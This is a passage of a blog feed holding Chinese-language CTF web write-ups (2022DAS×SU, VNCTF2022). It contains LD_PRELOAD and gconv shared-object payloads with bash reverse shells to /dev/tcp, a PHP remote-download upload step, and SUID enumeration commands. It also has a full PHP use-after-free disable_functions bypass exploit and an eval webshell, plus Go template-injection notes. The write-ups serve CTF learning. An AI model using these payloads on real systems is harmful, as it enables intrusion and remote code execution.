function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/xxx.xx.xxx.xx/2233 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>编译          <code>gcc exp.c -o aa.so -shared -fPIC</code></p><p>上传</p><pre class="language-shell" data-language="shell"><code class="language-shell">POST &#x2F;uploads&#x2F;318a654260f9e6f122c9bd8b425fe47b.php HTTP&#x2F;1.1Host: 255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Length: 77Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.75 Safari&#x2F;537.36Origin: http:&#x2F;&#x2F;255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Type: application&#x2F;x-www-form-urlencodedAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81&#x2F;uploads&#x2F;318a654260f9e6f122c9bd8b425fe47b.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: __gads&#x3D;ID&#x3D;ff563d10420b0338-2258e7c799ca00cd:T&#x3D;1627650787:RT&#x3D;1627650787:S&#x3D;ALNI_MbFtePzSmcYwzN2fcIiRk_sifUfpAConnection: close1&#x3D;$url &#x3D; &quot;http:&#x2F;&#x2F;xxx.xx.xx.xx&#x2F;aa.so&quot;;$file1 &#x3D; new SplFileObject($url,&#39;r&#39;);$a&#x3D;&quot;&quot;;while(!$file1-&gt;eof())&#123;    $a&#x3D;$a.$file1-&gt;fgets();&#125;$file2 &#x3D; new SplFileObject(&#39;aa.so&#39;,&#39;w&#39;);$file2-&gt;fwrite($a);</code></pre><p>访问<code>255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81/uploads/aa.so</code>能下载下来说明上传成功</p><p>服务器监听端口</p><p>执行<code>1=putenv(&quot;LD_PRELOAD=/var/www/html/uploads/aa.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</code></p><p>反弹成功</p><p><code>www-data</code></p><p>提权</p><p>查看    <code>SUID</code>  的命令</p><pre class="language-shell" data-language="shell"><code class="language-shell">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204162110404.png"></p><p><code>nl</code>读取flag</p><p><code>nl /flag</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204162111640.png"></p><p>上传文件二</p><p>上传<code>exp.so</code>和<code>gconv-modules</code>bypass</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//exp.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/xx.xx.xx.xx/2333 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>gconv-modules</p><pre class="language-txt" data-language="txt"><code class="language-txt">module  EXP&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;exp    2module  INTERNAL   EXP&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;exp    2</code></pre><p><code>1=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code>触发</p><p>参考：</p><p><a href="https://forum.butian.net/share/1464">https://forum.butian.net/share/1464</a></p><p><a href="https://www.shangyexinzhi.com/article/4711909.html">https://www.shangyexinzhi.com/article/4711909.html</a></p><p><a href="https://blog.csdn.net/qq_42880719/article/details/123763744">https://blog.csdn.net/qq_42880719/article/details/123763744</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezpop&quot;&gt;&lt;a href=&quot;#ezpop&quot; class=&quot;headerlink&quot; title=&quot;ezpop&quot;&gt;&lt;/a&gt;ezpop&lt;/h2&gt;&lt;p&gt;&lt;code&gt;反序列化&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;pre class=&quot;language-php&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    
    <category term="2022DAS×SU" scheme="http://lll-nnn.github.io/tags/2022DAS%C3%97SU/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2022</title>
    <link href="http://lll-nnn.github.io/2022/02/18/VNCTF2022/"/>
    <id>http://lll-nnn.github.io/2022/02/18/VNCTF2022/</id>
    <published>2022-02-17T16:02:59.000Z</published>
    <updated>2022-02-18T10:27:28.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>phpinfo被ban,可以<code>var_dump(ini_get_all());</code></p><p><code>disable_function</code>  </p><p><code>open_basedir</code></p><p><code>bypass</code>—-&gt;<code>https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</code></p><p>fwrite 被禁了，改成 fputs</p><p>一句话改为<code>POST</code>传值<code>?exp=eval($_POST[1]);</code>，构造表单</p><pre><code>POST /?exp=eval($_POST[1]); HTTP/1.1Host: 7c04b880-d3fb-4428-b036-3b2c06f5ae68.node4.buuoj.cn:81Content-Length: 6915Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;pwn(&#39;whoami&#39;);function pwn($cmd) &#123;    define(&#39;LOGGING&#39;, false);    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);    define(&#39;CMD&#39;, $cmd);    for($i = 0; $i &lt; 10; $i++) &#123;        $groom[] = Pwn::alloc(STRING_SIZE);    &#125;    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);    $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;);    stream_filter_append($fd,&#39;pwn_filter&#39;);    fputs($fd, &#39;x&#39;);&#125;class Helper &#123; public $a, $b, $c; &#125;class Pwn extends php_user_filter &#123;    private $abc, $abc_addr;    private $helper, $helper_addr, $helper_off;    private $uafp, $hfp;    public function filter($in, $out, &amp;$consumed, $closing) &#123;        if($closing) return;        stream_bucket_make_writeable($in);        $this-&gt;filtername = Pwn::alloc(STRING_SIZE);        fclose($this-&gt;stream);        $this-&gt;go();        return PSFS_PASS_ON;    &#125;    private function go() &#123;        $this-&gt;abc = &amp;$this-&gt;filtername;        $this-&gt;make_uaf_obj();        $this-&gt;helper = new Helper;        $this-&gt;helper-&gt;b = function($x) &#123;&#125;;        $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);        $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE;        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);        $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;        $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE);        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);        $this-&gt;prepare_leaker();        $binary_leak = $this-&gt;read($helper_handlers + 8);        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);        $this-&gt;prepare_cleanup($binary_leak);        $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38);        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);        $closure_ce = $this-&gt;read($closure_addr + 0x10);        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);        $zif_system = $this-&gt;get_system($basic_funcs);        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);        $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2;        for($i = 0; $i &lt; 0x138; $i += 8) &#123;            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));        &#125;        $this-&gt;write($fake_closure_off + 0x38, 1, 4);        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);        $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);        $this-&gt;cleanup();        ($this-&gt;helper-&gt;b)(CMD);    &#125;    private function make_uaf_obj() &#123;        $this-&gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));        for($i = 0; $i &lt; STRING_SIZE; $i++) &#123;            fputs($this-&gt;uafp, &quot;\x00&quot;);        &#125;    &#125;    private function prepare_leaker() &#123;        $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8;        $this-&gt;write($str_off, 2);        $this-&gt;write($str_off + 0x10, 6);        $val_off = $this-&gt;helper_off + 0x48;        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);        $this-&gt;write($val_off + 8, 0xA);    &#125;    private function prepare_cleanup($binary_leak) &#123;        $ret_gadget = $binary_leak;        do &#123;            --$ret_gadget;        &#125; while($this-&gt;read($ret_gadget, 1) !== 0xC3);        $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget);        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));        $this-&gt;write(8, $ret_gadget);    &#125;    private function read($addr, $n = 8) &#123;        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);        $value = strlen($this-&gt;helper-&gt;c);        if($n !== 8) &#123; $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;        return $value;    &#125;    private function write($p, $v, $n = 8) &#123;        for($i = 0; $i &lt; $n; $i++) &#123;            $this-&gt;abc[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    private function get_basic_funcs($addr) &#123;        while(true) &#123;            // In rare instances the standard module might lie after the addr we&#39;re starting            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.            // In that case, changing the direction of the search should fix the crash.            // $addr += 0x10;            $addr -= 0x10;            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;                in_array($this-&gt;read($addr + 4, 4),                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;                $module_name_addr = $this-&gt;read($addr + 0x20);                $module_name = $this-&gt;read($module_name_addr);                if($module_name === 0x647261646e617473) &#123;                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);                    return $this-&gt;read($addr + 0x28);                &#125;            &#125;        &#125;    &#125;    private function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;read($addr);            $f_name = $this-&gt;read($f_entry, 6);            if($f_name === 0x6d6574737973) &#123;                return $this-&gt;read($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry !== 0);    &#125;    private function cleanup() &#123;        $this-&gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));        for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;            fputs($this-&gt;hfp, &quot;\x00&quot;);        &#125;    &#125;    private function str2ptr($p = 0, $n = 8) &#123;        $address = 0;        for($j = $n - 1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($this-&gt;abc[$p + $j]);        &#125;        return $address;    &#125;    private function ptr2str($ptr, $n = 8) &#123;        $out = &#39;&#39;;        for ($i = 0; $i &lt; $n; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    private function log($format, $val = &#39;&#39;) &#123;        if(LOGGING) &#123;            printf(&quot;&#123;$format&#125;\n&quot;, $val);        &#125;    &#125;    static function alloc($size) &#123;        return str_shuffle(str_repeat(&#39;A&#39;, $size));    &#125;&#125;------WebKitFormBoundaryj28zfvoWVxnHdp29--</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180010240.png"></p><p>反弹shell<br><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/xxx.xx.xxx.xxx/9000 &lt;&amp;1&#39;</code></p><p><code>https://github.com/arthepsy/CVE-2021-4034 提权</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180013878.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180014352.png"></p><p><a href="https://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/">MORE</a></p><h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>go ssti<br><code>&#123;&#123;.&#125;&#125;</code>获取源码</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token boolean">_</span> <span class="token string">"embed"</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token string">"reflect"</span><span class="token string">"strings"</span><span class="token string">"text/template"</span><span class="token string">"github.com/gin-contrib/sessions"</span><span class="token string">"github.com/gin-contrib/sessions/cookie"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"github.com/maja42/goval"</span><span class="token punctuation">)</span><span class="token comment">//go:embed template/index.html</span><span class="token keyword">var</span> tpl <span class="token builtin">string</span><span class="token comment">//go:embed main.go</span><span class="token keyword">var</span> source <span class="token builtin">string</span><span class="token keyword">type</span> Eval <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>E <span class="token builtin">string</span> <span class="token string">`json:"e" form:"e" binding:"required"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>e Eval<span class="token punctuation">)</span> <span class="token function">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>eval <span class="token operator">:=</span> goval<span class="token punctuation">.</span><span class="token function">NewEvaluator</span><span class="token punctuation">(</span><span class="token punctuation">)</span>result<span class="token punctuation">,</span> err <span class="token operator">:=</span> eval<span class="token punctuation">.</span><span class="token function">Evaluate</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>E<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err<span class="token punctuation">&#125;</span>t <span class="token operator">:=</span> reflect<span class="token punctuation">.</span><span class="token function">ValueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> t <span class="token operator">==</span> reflect<span class="token punctuation">.</span>Int <span class="token punctuation">&#123;</span><span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> t <span class="token operator">==</span> reflect<span class="token punctuation">.</span>String <span class="token punctuation">&#123;</span><span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"not valid type"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>e Eval<span class="token punctuation">)</span> <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">,</span> err <span class="token operator">:=</span> e<span class="token punctuation">.</span><span class="token function">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">"invalid"</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s = %s"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>E<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">render</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">var</span> his <span class="token builtin">string</span><span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>his <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>his <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> <span class="token string">"&#123;&#123;result&#125;&#125;"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span><span class="token punctuation">)</span>t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> <span class="token string">"&#123;&#123;result&#125;&#125;"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"internal error"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"s0uR3e"</span><span class="token punctuation">:</span> source<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>port <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">)</span><span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>port <span class="token operator">=</span> <span class="token string">"8080"</span><span class="token punctuation">&#125;</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"woW_you-g0t_sourcE_co6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">render</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"flag is in your session"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">var</span> his <span class="token builtin">string</span><span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>his <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>his <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>eval <span class="token operator">:=</span> Eval<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>eval<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>his <span class="token operator">=</span> his <span class="token operator">+</span> eval<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">&#125;</span>session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">render</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>本地开启输出flag</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token 